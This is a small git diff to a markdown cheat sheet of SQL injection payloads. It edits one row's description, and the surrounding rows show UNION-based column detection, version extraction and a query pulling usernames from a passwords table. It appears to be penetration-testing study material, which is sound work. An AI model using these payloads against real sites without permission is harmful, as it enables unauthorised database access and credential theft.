@@ -60,7 +60,7 @@ category: cheatsheets
 | [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
 | **Union Injection** |
 | ```' order by 1-- -``` | Detect number of columns using ```order by``` |
-| ```cn' UNION select 2,2,3-- -``` | Detect number of columns using Union injection |
+| ```cn' UNION select 2,2,3-- -``` | Detect number of columns using Union injection add a value everytime |
 | ```cn' UNION select 1,@@version,3,4-- -``` | Basic Union injection, Find where you can return data |
 | ```UNION select username, 2, 3, 4 from passwords-- -``` | Union injection for 4 columns |
 | **DB Enumeration** |
